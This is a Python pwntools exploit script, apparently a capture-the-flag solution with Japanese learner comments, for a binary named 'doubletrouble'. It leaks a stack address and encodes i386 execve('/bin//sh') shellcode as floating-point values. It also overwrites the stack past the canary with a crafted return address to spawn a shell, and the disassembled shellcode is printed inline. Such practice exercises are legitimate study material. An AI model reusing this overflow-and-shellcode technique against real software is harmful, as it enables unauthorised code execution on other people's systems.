# Import the libraries
from pwn import *
import struct
import warnings
warnings.simplefilter("ignore")

target = process('./doubletrouble')
gdb.attach(target, gdbscript="b *0x08049631")

stack_leak = target.recv(10)
stack = int(stack_leak, 16)
#多分shellcodeの位置になる
scadr = stack + 0x1d8

"""
0x8049010は本来のリターンアドレスよりは小さいはず
自分の指針ではこのアドレスより大きいropでやる予定だったので
小さいアドレスで本当に動くかどうかはみておく
"""
ret = "0x8049010" + hex(scadr).replace("0x", "")
ret = int(ret, 16)

"""
作者手製のshellcode いつか自分でできるようになりたい
スタックの中で順番通りになるように調整
"""
s1 = "-9.455235083177544e-227"# 0x9101eb51e1f7c931
s2 = "-6.8282747051424842e-229"# 0x90909068732f2f68 
s3 = "-6.6994892300412978e-229"# 0x9090406e69622f68
s4 = "-1.3287388429188698e-231"# 0x900080cd0bb0e389
'''
   0xffff7ca0: xor    ecx,ecx
   0xffff7ca2: mul    ecx
   0xffff7ca4: push   ecx
   0xffff7ca5: jmp    0xffff7ca8
   0xffff7ca7: xchg   ecx,eax
   0xffff7ca8: push   0x68732f2f
   0xffff7cad: nop
   0xffff7cae: nop
   0xffff7caf: nop
   0xffff7cb0: push   0x6e69622f
   0xffff7cb5: inc    eax
   0xffff7cb6: nop
   0xffff7cb7: nop
   0xffff7cb8: mov    ebx,esp
   0xffff7cba: mov    al,0xb
   0xffff7cbc: int    0x80
'''

target.recvuntil("How long: ")
target.sendline("64")

for i in range(5):
   target.recvuntil("Give me: ")
   #0xff820d8400000000
   #なぜこの値なのかはまだわからない
   target.sendline("-1.5846380065386629e+306")

#shellcodeとret併せて5つ送り込みたいので5
target.recvuntil("Give me: ")
target.sendline("-50")

for i in range(51):
   target.recvuntil("Give me: ")
   target.sendline("-1.5846380065386629e+306")

#カナリアとリターンアドレスの間にある値らしい？
target.sendline('3.7857669957336791e-270')

target.recvuntil("Give me: ")
target.sendline(s1)
target.recvuntil("Give me: ")
target.sendline(s2)
target.recvuntil("Give me: ")
target.sendline(s3)
target.recvuntil("Give me: ")
target.sendline(s4)

""" 
retアドレス
doubleは64bit 
p64でパックした16進数double型に変換して%指定子で19に指定
"%.19g"の間にある%は文法であって除算ではない
参考:https://www.javadrive.jp/python/string/index23.html
"""
target.sendline("%.19g" % struct.unpack("<d", p64(ret)))

#よくわからない 多分ガジェットのアドレス
target.sendline('4.8653382194983783e-270')

target.interactive()